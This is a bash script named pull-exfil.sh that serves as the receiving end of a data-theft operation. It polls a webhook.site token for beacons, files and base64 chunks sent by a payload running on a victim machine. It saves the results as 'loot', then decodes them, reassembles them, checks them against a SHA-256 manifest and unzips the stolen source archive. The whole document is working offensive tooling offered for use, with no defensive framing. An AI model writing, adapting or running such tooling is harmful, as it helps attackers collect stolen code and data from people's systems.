#!/usr/bin/env bash
#
# pull-exfil.sh — collect and reassemble an exfil run from a webhook.site token.
#
#   ./pull-exfil.sh <token-uuid> [outdir]
#
# Endpoints written by the payload: hello, f-<name>, manifest, c<i>, done.
# Small artifacts are written decoded; chunked blobs are concatenated, verified
# against the manifest SHA-256, and extracted.

set -uo pipefail

TOKEN="${1:-}"
OUT="${2:-loot}"
[ -n "$TOKEN" ] || { echo "usage: $0 <webhook.site-token-uuid> [outdir]" >&2; exit 1; }

API="https://webhook.site/token/$TOKEN/requests"
PY="${PYTHON:-python3}"

mkdir -p "$OUT/files"
echo "[*] polling (Ctrl-C to stop) — watching for 'hello'"
echo "[*] dashboard: https://webhook.site/#!/$TOKEN"

hello=0
for attempt in $(seq 1 120); do
  res=$("$PY" - "$API" "$OUT" <<'PY'
import json, os, sys, urllib.request

api, out = sys.argv[1], sys.argv[2]
try:
    req = urllib.request.Request(api + "?sorting=newest", headers={"Accept": "application/json"})
    with urllib.request.urlopen(req, timeout=25) as r:
        raw = r.read()
    data = json.loads(raw) if raw.strip() else {}
except Exception as e:
    print("ERR " + type(e).__name__)
    raise SystemExit(0)

new = 0
for q in (data.get("data") or []):
    path = (q.get("url") or "").rstrip("/").split("/")[-1]
    body = q.get("content") or ""
    if not path:
        continue
    if path == "hello":
        p = os.path.join(out, "hello.txt")
        if not os.path.exists(p):
            open(p, "w").write(body); new += 1; print("HELLO")
    elif path.startswith("f-"):
        p = os.path.join(out, "files", path[2:] + ".b64")
        if not os.path.exists(p):
            open(p, "w").write(body); new += 1
    elif path == "manifest":
        p = os.path.join(out, "manifest.txt")
        if not os.path.exists(p):
            open(p, "w").write(body); new += 1
    elif path == "done":
        p = os.path.join(out, ".done")
        if not os.path.exists(p):
            open(p, "w").write("1"); new += 1; print("DONE")
    elif path.startswith("c") and path[1:].isdigit():
        p = os.path.join(out, "chunk-%05d.b64" % int(path[1:]))
        if not os.path.exists(p):
            open(p, "w").write(body); new += 1
if new:
    print("NEW %d" % new)
PY
)
  case "$res" in
    *ERR*) echo "  $res" ;;
    *HELLO*) hello=1; echo "[+] payload executed — beacon received" ;;
    *NEW*) echo "  $res" ;;
  esac
  [ -f "$OUT/.done" ] && { echo "[+] transfer complete"; break; }
  sleep 5
done

if [ -f "$OUT/hello.txt" ]; then
  echo "[*] hello: $(cat "$OUT/hello.txt")"
else
  echo "[!] no hello beacon — payload may not have executed, or egress is blocked" >&2
fi

# decode small artifacts
for b in "$OUT"/files/*.b64; do
  [ -e "$b" ] || continue
  "$PY" -c "import base64,sys,os;d=open(sys.argv[1]).read();open(sys.argv[1][:-4],'wb').write(base64.b64decode(d))" "$b" 2>/dev/null
done

if ! ls "$OUT"/chunk-*.b64 >/dev/null 2>&1; then
  echo "[!] no chunks — nothing to reassemble" >&2
  exit 1
fi

cat "$OUT"/chunk-*.b64 > "$OUT/src.b64"
"$PY" - "$OUT" <<'PY'
import base64, hashlib, os, sys
out = sys.argv[1]
raw = base64.b64decode(open(os.path.join(out, "src.b64")).read())
open(os.path.join(out, "src.zip"), "wb").write(raw)
print("[*] bytes:", len(raw))
man = open(os.path.join(out, "manifest.txt")).read()
for kv in man.split("&"):
    if kv.startswith("sha="):
        want, got = kv[4:].upper(), hashlib.sha256(raw).hexdigest().upper()
        print("[*] sha256:", "MATCH" if got == want else "MISMATCH")
PY

(cd "$OUT" && unzip -o -q src.zip -d src 2>/dev/null && echo "[+] extracted to $OUT/src")
